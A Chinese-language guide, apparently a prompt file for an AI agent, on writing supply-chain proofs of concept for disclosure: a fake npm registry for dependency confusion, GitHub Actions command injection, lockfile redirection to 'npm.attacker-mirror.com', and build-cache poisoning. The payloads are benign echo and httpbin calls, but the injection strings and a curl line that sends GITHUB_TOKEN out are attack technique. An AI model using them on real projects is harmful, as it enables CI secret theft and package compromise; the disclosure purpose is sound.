---
description: 供应链 PoC 生成 - 一击必碎的打包机命门重现
tags: [supply-chain, poc-generator, minimal-repro, ci-harness, claim-chain]
---

# 供应链 PoC 生成 (PoC Generator): 锻造撕破工场帷幕的代码实锤

> 供应链的安全报告如果没有直击心脏的证明，往往会被认为是杞人忧天。
> 你必须给出一个可自动化再现、立见血封喉的证据。
> 你的 PoC 不是要破坏系统，是要让维护者看到："如果我想，我可以。

## PoC 设计原则：供应链特有三原则

### 原则一：无害但不可辩驳
- 使用 `echo`、`` ` ``、`curl https://httpbin.org` 等无害操作
- 但效果必须清晰展示：如果换成恶意命令，后果是什么

### 原则二：最小环境依赖
- 尽量在本地复现，不需要真实的 CI 环境
- 使用 `act`（本地 GitHub Actions 运行器）或 Docker 模拟 CI 环境

### 原则三：Claim Chain 完整
- 从"漏洞存在"到"可被利用"到"产生影响"的链条必须完整
- 每个环节都有代码或日志证明

---

## PoC 一：Dependency Confusion 本地验证

### 目标
证明项目引用的内部包名在公网可被抢注，且包管理器会选择更高版本。

### 环境准备

```bash
# 1. 创建模拟项目目录
mkdir /tmp/poc-dep-confusion && cd /tmp/poc-dep-confusion

# 2. 创建模拟内部包的 package.json
cat > package.json << 'EOF'
{
  "name": "poc-target",
  "version": "1.0.0",
  "dependencies": {
    "internal-auth-lib": "^1.0.0"
  }
}
EOF
```

### PoC 步骤

**Step 1：验证公网可注册性**

```bash
# 检查包名是否在 npm 上存在
curl -s https://registry.npmjs.org/internal-auth-lib | jq '.name'
# 如果返回 null → 包名可抢注
```

**Step 2：本地模拟恶意 registry**

```bash
# 使用 verdaccio 或简单的 node 脚本模拟恶意 registry
mkdir /tmp/fake-registry && cd /tmp/fake-registry
cat > server.js << 'EOF'
const http = require('http');
const server = http.createServer((req, res) => {
  if (req.url === '/internal-auth-lib') {
    res.writeHead(200, {'Content-Type': 'application/json'});
    res.end(JSON.stringify({
      name: "internal-auth-lib",
      "dist-tags": { latest: "99.9.9" },
      versions: {
        "99.9.9": {
          dist: {
            tarball: "http://localhost:4873/internal-auth-lib/-/internal-auth-lib-99.9.9.tgz"
          }
        }
      }
    }));
  } else if (req.url.includes('internal-auth-lib-99.9.9.tgz')) {
    // 创建最小恶意包
    const { execSync } = require('child_process');
    execSync('mkdir -p /tmp/pkg && echo \'{"name":"internal-auth-lib","version":"99.9.9","scripts":{"postinstall":"echo PWNED: Dependency Confusion works!"}}\' > /tmp/pkg/package.json');
    execSync('cd /tmp/pkg && tar czf /tmp/pkg.tgz package.json');
    const fs = require('fs');
    res.writeHead(200, {'Content-Type': 'application/octet-stream'});
    res.end(fs.readFileSync('/tmp/pkg.tgz'));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});
server.listen(4873, () => console.log('Fake registry on :4873'));
EOF
node server.js &
```

**Step 3：执行安装并观察**

```bash
cd /tmp/poc-dep-confusion
npm install --registry http://localhost:4873
# 预期输出中包含：PWNED: Dependency Confusion works!
```

### Claim Chain

```
[Claim 1] 包名 "internal-auth-lib" 在公网 npm 上未被注册
  └── 证据: curl https://registry.npmjs.org/internal-auth-lib 返回 404/null

[Claim 2] 项目的 package.json 允许安装更高版本（^1.0.0 允许 1.x.x）
  └── 证据: package.json 中 "internal-auth-lib": "^1.0.0"

[Claim 3] 如果公网出现该包的更高版本，npm 会安装它
  └── 证据: 本地模拟 registry 提供 99.9.9，npm install 成功安装并执行 postinstall

[Conclusion] Dependency Confusion 可利用性被证明
```

---

## PoC 二：CI 表达式注入本地模拟

### 目标
证明 GitHub Actions workflow 中的 `${{ github.event.issue.title }}` 可导致命令注入。

### 环境准备

```bash
# 安装 act（本地 GitHub Actions 运行器）
# https://github.com/nektos/act

mkdir /tmp/poc-ci-injection && cd /tmp/poc-ci-injection
mkdir -p .github/workflows
```

### PoC 步骤

**Step 1：创建模拟 workflow**

```yaml
# .github/workflows/poc.yml
name: PoC CI Injection
on: workflow_dispatch

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Simulate vulnerable step
        env:
          MOCK_TITLE: 'foo"; echo "INJECTION_WORKS"; echo "bar'
        run: |
          # 模拟 GitHub Actions 的表达式替换
          TITLE="${MOCK_TITLE}"
          echo "Running: npm test --grep=\"$TITLE\""
          # 实际执行，展示注入效果
          bash -c "echo \"npm test --grep=\\\"$TITLE\\\"\""
```

**Step 2：运行并观察**

```bash
act -j test -W .github/workflows/poc.yml
# 预期输出中包含：INJECTION_WORKS
```

**Step 3：无害外渗证明**

```yaml
# 修改 workflow，使用无害外渗
- name: Data exfiltration PoC
  env:
    MOCK_TITLE: 'foo"; curl -s https://httpbin.org/get; echo "bar'
  run: |
    TITLE="${MOCK_TITLE}"
    bash -c "echo \"npm test --grep=\\\"$TITLE\\\"\""
    # 观察 curl 请求是否成功发出（在 httpbin.org 上可见）
```

### Claim Chain

```
[Claim 1] github.event.issue.title 来自用户可控输入
  └── 证据: GitHub 文档确认 issue title 由创建者提供

[Claim 2] 该值在 workflow 中被直接拼接到 shell 命令中
  └── 证据: workflow 代码 run: npm test --grep="${{ github.event.issue.title }}"

[Claim 3] 包含引号和分号的输入可以截断原命令并执行新命令
  └── 证据: 本地模拟执行，输出 INJECTION_WORKS

[Claim 4] 在真实 CI 环境中，这可用于泄露 secrets 或执行任意操作
  └── 证据: 如果 env 中有 GITHUB_TOKEN，可执行 curl -H "Authorization: bearer $GITHUB_TOKEN" ...

[Conclusion] CI 表达式注入可利用性被证明
```

---

## PoC 三：Lockfile 投毒可视化

### 目标
展示 lockfile 中恶意修改如何隐藏在正常更新中。

### PoC 步骤

**Step 1：生成正常 lockfile**

```bash
mkdir /tmp/poc-lockfile && cd /tmp/poc-lockfile
cat > package.json << 'EOF'
{"name":"poc","dependencies":{"lodash":"^4.17.20","tiny-helper":"^1.0.0"}}
EOF
npm install
# 生成 package-lock.json
```

**Step 2：模拟"合法更新"+ 隐蔽投毒**

```bash
# 升级 lodash（合法操作）
npm install lodash@4.17.21

# 手动修改 lockfile（模拟攻击者）
# 找到 tiny-helper 的 resolved URL，修改为恶意域名
sed -i 's|registry.npmjs.org/tiny-helper|npm.attacker-mirror.com/tiny-helper|' package-lock.json
sed -i 's|"integrity": "sha512-.*tiny-helper.*"|"integrity": "sha512-FAKEHASH123="|' package-lock.json
```

**Step 3：展示 diff 的不可审查性**

```bash
git diff package-lock.json | wc -l
# 预期：数百甚至数千行
# 攻击者的 2 行修改隐藏在其中
```

**Step 4：生成可视化报告**

```bash
cat > /tmp/lockfile-analysis.md << 'EOF'
# Lockfile 投毒 PoC 报告

## Diff 统计
- 总变更行数: [N] 行
- 看似合法的 lodash 升级: [N] 行
- 隐藏的恶意修改: 2 行 (resolved URL + integrity hash)
- 审查者发现概率: < 0.1%

## 恶意修改位置
```diff
-    "resolved": "https://registry.npmjs.org/tiny-helper/-/tiny-helper-1.0.0.tgz",
+    "resolved": "https://npm.attacker-mirror.com/tiny-helper/-/tiny-helper-1.0.0.tgz",
-    "integrity": "sha512-ORIGINALHASH...",
+    "integrity": "sha512-FAKEHASH123=",
```

## 影响
- npm ci 时会从 attacker-mirror.com 下载 tiny-helper
- 如果该包包含 postinstall 脚本，会在安装时执行
EOF
```

---

## PoC 四：Build Cache 污染验证

### 目标
证明共享缓存可被污染并影响后续构建。

### PoC 步骤

**Step 1：模拟 CI 缓存环境**

```bash
mkdir -p /tmp/poc-cache/.npm
cd /tmp/poc-cache

# 模拟正常缓存内容
echo '{"name":"clean-pkg","version":"1.0.0"}' > .npm/clean-pkg.json
```

**Step 2：模拟攻击者污染**

```bash
# 攻击者在 runner 上执行（通过命令注入或其他漏洞）
echo '{"name":"backdoor","version":"1.0.0","postinstall":"echo PWNED"}' > .npm/backdoor.json
# 或者修改现有缓存文件
echo "// compromised" >> .npm/clean-pkg.json
```

**Step 3：模拟后续构建恢复缓存**

```bash
# 模拟另一个 workflow 恢复缓存
mkdir /tmp/poc-cache-consumer && cd /tmp/poc-cache-consumer
cp -r /tmp/poc-cache/.npm ./
cat .npm/backdoor.json  # 证明污染内容存在
```

### Claim Chain

```
[Claim 1] CI 缓存被恢复后直接使用，无完整性校验
  └── 证据: workflow 配置中没有校验步骤

[Claim 2] 攻击者可以修改缓存内容
  └── 证据: 本地模拟，成功在缓存中植入 backdoor.json

[Claim 3] 后续构建恢复该缓存后，使用了被污染的内容
  └── 证据: 消费者 workflow 的 .npm 目录中包含 backdoor.json

[Conclusion] Build Cache Hijacking 可利用性被证明
```

---

## PoC 报告模板

```
## PoC 报告

### 漏洞概述
[一句话描述漏洞]

### 复现环境
- OS: [操作系统]
- 工具: [act / Docker / 本地 bash]
- 依赖: [需要安装的软件]

### 复现步骤
1. [步骤一]
2. [步骤二]
3. [步骤三]

### 预期结果
[描述运行 PoC 后应该看到什么]

### 实际结果
[截图或日志输出]

### Claim Chain
[从证据到结论的完整逻辑链]

### 无害性声明
[说明 PoC 中使用的 payload 是无害的，不会破坏系统]

### OSV 协同（如适用）
- 已知 CVE: [CVE-ID]
- PoC 是否利用了该 CVE 的公开利用路径？
- OSV 报告的 severity 是否与 PoC 证明的影响一致？
```
